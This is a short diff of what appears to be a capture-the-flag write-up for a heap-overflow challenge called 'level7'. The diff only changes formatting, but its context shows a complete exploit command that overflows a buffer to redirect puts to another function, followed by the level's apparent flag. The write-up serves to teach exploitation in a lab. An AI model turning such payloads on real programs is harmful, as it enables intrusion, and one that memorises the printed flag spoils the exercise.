@@ -77,7 +77,8 @@ strcpy(0x37614136, NULL <unfinished ...> --> 20 in the Buffer Overflow pattern g
 ```  
 --> offset is at 20  
 
-- Build the command
+- Build the command  
+
 `
 ./level7 arg1 arg2
 arg1 = x padding to overflow into 3rd malloc, and replace ptr2[1] with address of puts
@@ -85,7 +86,8 @@ arg2 = address of m
 `
 -> so that we have strcpy(dest: &puts, src: &m), so when we call puts("~~"), we will call m in reality.
 
-- Final Command
+- Final Command  
+
 ```
 ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
